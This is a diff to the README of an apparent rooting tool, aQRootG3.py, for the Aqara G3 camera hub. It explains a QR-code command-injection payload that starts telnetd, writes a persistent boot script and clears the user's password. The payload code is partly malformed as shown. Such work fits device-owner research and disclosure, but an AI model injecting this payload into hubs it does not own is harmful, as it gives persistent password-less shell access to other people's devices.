@@ -18,7 +18,7 @@ Usage
 ```bash
 usage: aQRootG3.py [-h] ssid pwd [filename]
 
-aQRootG3 v0.1
+aQRootG3 v0.2
 Enable telnet via qrcode command injection for Aqara G3 hub
 
 positional arguments:
@@ -56,22 +56,20 @@ Linux Camera-Hub-G3-BEEF 4.9.84 #67 SMP PREEMPT Mon Sep 6 17:51:23 CST 2021 armv
 Payload Explanation
 ---------------
 ```python
-payload = {
-    "b": f"lumiLZc1dhEfPzMN",               # Made up bind_key
-    "d": ";".join(
-        [
-            domain,                         # Domain being queried by nslookup, defaulting to "aiot-coap.aqara.cn"
-            'x="fw_""manager.sh"',          # Workaround - Script checks if it's already running by grepping ps.
-            "$x -t -k",                     # Enable tty and telnetd
-            "$x -t -f",                     # Create default /data/scripts/post_init.sh
-            "y=/data/scripts/post_init.sh",
-            'echo "$x -t -k" >> $y',        # Append tty enable and telnetd start to post_init script
-            "chmod 555 $y",                 # Remove write access to post_init script
-        ]
-    ),
-    "x": cipher(ssid.encode()),             # Ciphered SSID
-    "y": cipher(pwd.encode()),              # Ciphered Wireless Password
-    "l": "en",                              # Language
+payload=[
+    'x="fw_man"ager.sh',                    # Workaround - Script checks if it's already running by grepping ps.
+    'y=/data/scripts/post_init.sh',         
+    '$x -t -f',                             # Create default /data/scripts/post_init.sh
+    'z=`agetprop persist.app.bind_key`',    # post_init below exploits bind_key for additional storage
+    'echo -e $z>$y',                        # Write the contents to /data/scripts/post_init.sh
+    'tail -n2 $y|sh'                        # Clear $USER password, enable tty and start telnetd
+],
+post_init = [
+    '#\\x21/bin/sh',                        # Due to 'echo -e' in payload we need to ensure ! is not evaluated
+    'fw_manager.sh -r',                     # Start firmware as normal
+    'passwd -d $USER',                      # Clear $USER password
+    'fw_manager.sh -t -k'                   # Enable tty and start telnetd
+],
 }
 ```
 
